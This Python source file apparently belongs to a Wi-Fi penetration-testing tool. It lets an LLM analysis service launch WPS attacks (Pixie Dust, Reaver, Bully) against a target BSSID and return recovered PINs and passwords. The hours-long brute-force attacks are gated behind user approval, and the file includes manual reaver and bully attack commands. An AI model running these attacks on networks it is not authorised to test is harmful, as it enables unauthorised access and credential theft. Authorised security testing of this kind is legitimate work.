"""Extended tool handlers for LLM analysis — WPS attacks + handshake validation.

Mixin usage: AnalysisService imports these as methods. They expect
``self._on_approval`` from the parent class for gating expensive operations.
"""

from __future__ import annotations

import logging
from typing import Optional

logger = logging.getLogger(__name__)


def _parse_bssid(args: list) -> tuple[Optional[str], Optional[int]]:
    """Extract --bssid and --channel from arg list."""
    bssid, channel, i = None, None, 0
    while i < len(args):
        if args[i] == "--bssid" and i + 1 < len(args):
            bssid = args[i + 1]; i += 2
        elif args[i] == "--channel" and i + 1 < len(args):
            channel = int(args[i + 1]); i += 2
        else:
            i += 1
    return bssid, channel


class AttackToolsMixin:
    """Mix into AnalysisService to add pixie/reaver/bully/validate dispatch."""

    _on_approval = None  # type: ignore[assignment]  # provided by AnalysisService

    async def _tool_pixie(self, args: list) -> str:
        """Pixie dust WPS attack (~30s, automatic)."""
        bssid, channel = _parse_bssid(args)
        if not bssid:
            return "[!] pixie requires --bssid."
        try:
            from wifi_launchpad.providers.external.reaver_wps import pixie_dust, is_available
            if not is_available():
                return "[!] reaver not installed — cannot run pixie dust."
            result = await pixie_dust("wlan0", bssid, channel, timeout=60)
            if result.success:
                return f"[+] Pixie dust success! PIN={result.pin} PSK={result.password}"
            return f"[-] Pixie dust failed for {bssid}: {result.error}. Try PMKID or deauth next."
        except Exception as exc:
            return f"[!] Pixie dust error: {exc}"

    async def _tool_reaver(self, args: list) -> str:
        """Full WPS PIN brute force (hours, requires user approval)."""
        bssid, channel = _parse_bssid(args)
        if not bssid:
            return "[!] reaver requires --bssid."
        if self._on_approval:
            if not self._on_approval(f"Full Reaver brute on {bssid}. Takes hours. Approve?"):
                return f"[-] User declined Reaver on {bssid}."
        else:
            return f"[-] Reaver needs user approval. Run manually: sudo reaver -i wlan0 -b {bssid} -vv"
        try:
            from wifi_launchpad.providers.external.reaver_wps import full_brute, is_available
            if not is_available():
                return "[!] reaver not installed."
            result = await full_brute("wlan0", bssid, channel)
            if result.success:
                return f"[+] Reaver success! PIN={result.pin} PSK={result.password}"
            return f"[-] Reaver failed: {result.error}. Try bully as fallback."
        except Exception as exc:
            return f"[!] Reaver error: {exc}"

    async def _tool_bully(self, args: list) -> str:
        """Bully WPS brute force (hours, requires user approval, Reaver fallback)."""
        bssid, channel = _parse_bssid(args)
        if not bssid:
            return "[!] bully requires --bssid."
        if self._on_approval:
            if not self._on_approval(f"Bully brute on {bssid}. Takes hours. Approve?"):
                return f"[-] User declined Bully on {bssid}."
        else:
            return f"[-] Bully needs user approval. Run manually: sudo bully wlan0 -b {bssid} -v 3"
        try:
            from wifi_launchpad.providers.external.bully_wps import brute_force, is_available
            if not is_available():
                return "[!] bully not installed."
            result = await brute_force("wlan0", bssid, channel)
            if result.success:
                return f"[+] Bully success! PIN={result.pin} PSK={result.password}"
            return f"[-] Bully failed: {result.error}. No more WPS attack vectors."
        except Exception as exc:
            return f"[!] Bully error: {exc}"

    async def _tool_validate(self, args: list) -> str:
        """Validate a handshake capture via tshark EAPOL analysis."""
        filepath, i = None, 0
        while i < len(args):
            if args[i] == "--file" and i + 1 < len(args):
                filepath = args[i + 1]; i += 2
            else:
                i += 1
        if not filepath:
            return "[!] validate requires --file <path>."
        from pathlib import Path
        if not Path(filepath).exists():
            return f"[!] File not found: {filepath}"
        try:
            from wifi_launchpad.providers.external.tshark_wifi import parse_capture
            result = parse_capture(filepath)
            net_count = len(result.networks)
            client_count = len(result.clients)
            return f"[+] Validated: {net_count} network(s), {client_count} client(s) in capture."
        except Exception as exc:
            return f"[!] Validation failed: {exc}"


__all__ = ["AttackToolsMixin"]
